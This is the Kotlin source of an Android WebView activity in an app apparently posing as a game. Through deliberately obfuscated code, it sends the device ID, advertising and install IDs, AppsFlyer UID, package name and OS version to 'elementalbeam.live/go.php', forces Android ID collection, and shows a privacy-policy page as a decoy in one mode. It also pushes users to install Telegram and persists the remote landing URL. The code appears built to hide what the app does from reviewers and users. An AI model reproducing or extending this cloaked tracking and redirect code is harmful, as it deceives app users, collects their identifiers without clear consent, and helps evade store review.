package com.vectorunit.purple.policy

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.net.Uri
import android.os.*
import android.provider.MediaStore
import android.util.Log
import android.view.View
import android.webkit.*
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerLib
import com.vectorunit.purple.databinding.ActivityBeamBinding
import org.koin.androidx.viewmodel.ext.android.viewModel
import org.koin.core.qualifier.named
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*


class BeamAct : AppCompatActivity() {
    private lateinit var bindBeam: ActivityBeamBinding
    lateinit var beam: WebView

    private var mFilePathCallback: ValueCallback<Array<Uri>>? = null
    private var mCameraPhotoPath: String? = null
    private  val INPUT_FILE_REQUEST_CODE = 1

    private val viewBeamModel by viewModel<BeamModel>(
        named("BeamModel")
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bindBeam = ActivityBeamBinding.inflate(layoutInflater)
        setContentView(bindBeam.root)
        beam = bindBeam.webst
        CookieManager.getInstance().setAcceptCookie(true)
        CookieManager.getInstance().setAcceptThirdPartyCookies(beam, true)
        viewBeamModel.webSet(beam)


        beam.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, url: String): Boolean {
                try {
                    if (URLUtil.isNetworkUrl(url)) {
                        return false
                    }
                    if (viewBeamModel.appInstalledOrNot(url)) {

                        val intent = Intent(Intent.ACTION_VIEW)
                        intent.data = Uri.parse(url)
                        startActivity(intent)
                    } else {

                        Toast.makeText(
                            applicationContext,
                            "Application is not installed",
                            Toast.LENGTH_LONG
                        ).show()
                        startActivity(
                            Intent(
                                Intent.ACTION_VIEW,
                                Uri.parse("https://play.google.com/store/apps/details?id=org.telegram.messenger")
                            )
                        )
                    }
                    return true
                } catch (e: Exception) {
                    return false
                }
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
            }

            override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                super.onPageStarted(view, url, favicon)
            }

            override fun onReceivedError(
                view: WebView?,
                errorCode: Int,
                description: String?,
                failingUrl: String?
            ) {
                Toast.makeText(this@BeamAct, description, Toast.LENGTH_SHORT).show()
            }
        }

        beam.webChromeClient = ChromeClient()
        beam.loadUrl(urururururururur())
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {

        if (requestCode != INPUT_FILE_REQUEST_CODE || mFilePathCallback == null) {
            super.onActivityResult(requestCode, resultCode, data)
            return
        }
        var results: Array<Uri>? = null

        if (resultCode == RESULT_OK) {
            if (data == null) {
                if (mCameraPhotoPath != null) {
                    results = arrayOf(Uri.parse(mCameraPhotoPath))
                }
            } else {
                val dataString = data.dataString
                if (dataString != null) {
                    results = arrayOf(Uri.parse(dataString))
                }
            }
        }
        mFilePathCallback!!.onReceiveValue(results)
        mFilePathCallback = null
        return
    }


   inner class ChromeClient : WebChromeClient() {

        override fun onShowFileChooser(
            view: WebView?,
            filePath: ValueCallback<Array<Uri>>?,
            fileChooserParams: FileChooserParams?
        ): Boolean {
            mFilePathCallback?.onReceiveValue(null)
            mFilePathCallback = filePath
            var takePictureIntent: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
            if (takePictureIntent!!.resolveActivity(packageManager) != null) {
                var photoFile: File? = null
                try {
                    photoFile = createImageFile()
                    takePictureIntent.putExtra("PhotoPath", mCameraPhotoPath)
                } catch (ex: IOException) {
                    Log.e("ErrorOccurred", "Unable to create Image File", ex)
                }

                if (photoFile != null) {
                    mCameraPhotoPath = "file:" + photoFile.absolutePath
                    takePictureIntent.putExtra(
                        MediaStore.EXTRA_OUTPUT,
                        Uri.fromFile(photoFile)
                    )
                } else {
                    takePictureIntent = null
                }
            }
            val contentSelectionIntent = Intent(Intent.ACTION_GET_CONTENT)
            contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE)
            contentSelectionIntent.type = "image/*"
            val intentArray: Array<Intent?> = takePictureIntent?.let { arrayOf(it) } ?: arrayOfNulls(0)
            val chooserIntent = Intent(Intent.ACTION_CHOOSER)
            chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent)
            chooserIntent.putExtra(Intent.EXTRA_TITLE, "Image Chooser")
            chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray)
            startActivityForResult(chooserIntent, INPUT_FILE_REQUEST_CODE)
            return true
        }

        fun createImageFile(): File? {
            val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss").format(Date())
            val imageFileName = "JPEG_" + timeStamp + "_"
            val storageDir = Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_PICTURES
            )
            return File.createTempFile(
                imageFileName,
                ".jpg",
                storageDir
            )
        }
    }

    private fun urururururururur(): String {

        val sharPre = getSharedPreferences("SHARED_PREF",
            Context.MODE_PRIVATE)

        val pack = application.packageName.toString()

        val intent = intent
        val str = intent.getStringExtra("WebInt")


        val myTrId = sharPre.getString("myId", null)
        val myInstId: String? = sharPre.getString("instId", null)
        val cpOne: String? = sharPre.getString(C1, null)
        val dpOne: String? = sharPre.getString(deepL, null)
        val mainId: String? = sharPre.getString(MAIN_ID, "null")
        val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)


        val one = "deviceID="
        val subOne = "sub_id_1="
        val thrhtrhtrhtrht = "ad_id="
        val fofofofofofofofofo = "sub_id_4="
        val fififififififififif = "sub_id_5="
        val sisisisifsisis = "sub_id_6="

        val lololololololo = "naming"
        val trololo = "deeporg"


        val kiokjjlikjhmkij = Build.VERSION.RELEASE

//        val linkAB: String? = sharPre.getString(urlMain, null)

        val linkAB = "http://elementalbeam.live/go.php?to=2&"

        val linkNO = "https://www.privacy"
        val linkNT = "policies.com/live/"
        val linkNTH = "e0638d9d-11f4-4194-af55-8a8b10c66d2d"

        var aft = ""

        when (str) {
            "MT" -> {
                aft =
                    "$linkAB$one$myTrId&$thrhtrhtrhtrht$myInstId&$fofofofofofofofofo$pack&$fififififififififif$kiokjjlikjhmkij&$sisisisifsisis$lololololololo"
                viewBeamModel.pushToOS(myTrId.toString())
                Log.d("TESTAG", "urururururururur tracker: $aft")
            }
            "deepLink" -> {
                aft ="$linkAB$subOne$dpOne&$one$afId&$thrhtrhtrhtrht$mainId&$fofofofofofofofofo$pack&$fififififififififif$kiokjjlikjhmkij&$sisisisifsisis$trololo"
                viewBeamModel.pushToOS(myTrId.toString())
                Log.d("TESTAG", "urururururururur deep: $aft")
            }
            "campaign" -> {
                aft =
                    "$linkAB$subOne$cpOne&$one$afId&$thrhtrhtrhtrht$mainId&$fofofofofofofofofo$pack&$fififififififififif$kiokjjlikjhmkij&$sisisisifsisis$lololololololo"
                viewBeamModel.pushToOS(afId.toString())
                Log.d("TESTAG", "urururururururur apps: $aft")
            }
            "policy" -> {
                aft = "$linkNO$linkNT$linkNTH"
                Log.d("TESTAG", "urururururururur policy: $aft")
            }
        }

        return sharPre.getString("SAVED_URL", aft).toString()
    }

    var firsl = ""
    fun saveUrl(lurlurlurlurlur: String?) {
        if (!lurlurlurlurlur!!.contains("t.me")) {

            if (firsl == "") {
                firsl = getSharedPreferences(
                    "SHARED_PREF",
                    MODE_PRIVATE
                ).getString(
                    "SAVED_URL",
                    lurlurlurlurlur
                ).toString()

                val spspspspsppspspsp = getSharedPreferences("SHARED_PREF", MODE_PRIVATE)
                val ededededededed = spspspspsppspspsp.edit()
                ededededededed.putString("SAVED_URL", lurlurlurlurlur)
                ededededededed.apply()
            }
        }
    }
    private var exitexitexitexit = false
    override fun onBackPressed() {

            if (beam.canGoBack()) {
                if (exitexitexitexit) {
                    beam.stopLoading()
                    beam.loadUrl(firsl)
                }
                this.exitexitexitexit = true
                beam.goBack()
                Handler(Looper.getMainLooper()).postDelayed(Runnable {
                    exitexitexitexit = false
                }, 2000)

            } else {
                super.onBackPressed()
            }
        }
    }

